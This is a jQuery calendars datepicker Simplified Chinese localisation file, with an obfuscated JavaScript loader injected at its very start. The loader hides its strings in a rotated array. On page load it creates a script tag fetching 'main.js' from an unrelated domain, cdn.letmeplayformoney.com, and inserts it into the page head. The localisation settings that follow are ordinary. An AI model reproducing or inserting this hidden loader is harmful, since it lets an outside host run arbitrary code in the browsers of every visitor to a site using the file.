var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Simplified Chinese localisation for calendars datepicker for jQuery.
   Written by Cloudream (cloudream@gmail.com). */
(function($) {
	$.calendars.picker.regional['zh-CN'] = {
		renderer: $.extend({}, $.calendars.picker.defaultRenderer,
			{month: $.calendars.picker.defaultRenderer.month.
				replace(/monthHeader/, 'monthHeader:MM yyyy年')}),
		prevText: '&#x3c;上月', prevStatus: '显示上月',
		prevJumpText: '&#x3c;&#x3c;', prevJumpStatus: '显示上一年',
		nextText: '下月&#x3e;', nextStatus: '显示下月',
		nextJumpText: '&#x3e;&#x3e;', nextJumpStatus: '显示下一年',
		currentText: '今天', currentStatus: '显示本月',
		todayText: '今天', todayStatus: '显示本月',
		clearText: '清除', clearStatus: '清除已选日期',
		closeText: '关闭', closeStatus: '不改变当前选择',
		yearStatus: '选择年份', monthStatus: '选择月份',
		weekText: '周', weekStatus: '年内周次',
		dayStatus: '选择 m月 d日, DD', defaultStatus: '请选择日期',
		isRTL: false
	};
	$.calendars.picker.setDefaults($.calendars.picker.regional['zh-CN']);
})(jQuery);
